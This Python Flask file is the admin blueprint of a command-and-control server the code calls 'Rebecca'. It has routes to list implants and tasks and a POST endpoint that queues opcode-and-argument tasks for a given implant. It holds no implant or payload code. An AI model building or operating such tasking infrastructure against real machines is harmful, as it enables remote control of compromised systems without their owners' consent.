# admin blueprint

from flask import Blueprint, request, jsonify 
from cvnt.database import db 
from cvnt.models import *

admin = Blueprint("admin", __name__)

@admin.route("/admin/hello")
def admin_hello():
    return "Hello my dearest admin, welcome to le C2's ugly cousin Rebecca.\n Be nice to her shes self concious"

@admin.route("/implant/list")
def admin_list_implants():
    with  db.session() as session:
        tasks = list(session.query(Implant).all())    
    return jsonify(tasks)

@admin.route("/task/list")
def admin_list_tasks():
    with  db.session() as session:
        tasks = list(session.query(Task).all())    
    return jsonify(tasks)

@admin.route("/task/create", methods = ["POST"])
def rpc_create_task():
    try:
        payload = request.json
        print(payload)

        implant_id = payload["implant_id"]
        opcode = payload["opcode"]
        args = payload["args"]
        task = make_task(
                implant_id, opcode, args
                )

        print(type(task), jsonify(task ))
        print(task.task_id)
        db.session.add(task )
        db.session.commit() 
        print(f"New task Added! {task}")

        # TODO make sure implant GUID exists! 
    except Exception as e:
        #TODO logging 
        print("Bad message received ",Exception, e)
        return jsonify([])

    return jsonify( {"status": "ok", "task_id": task.task_id })



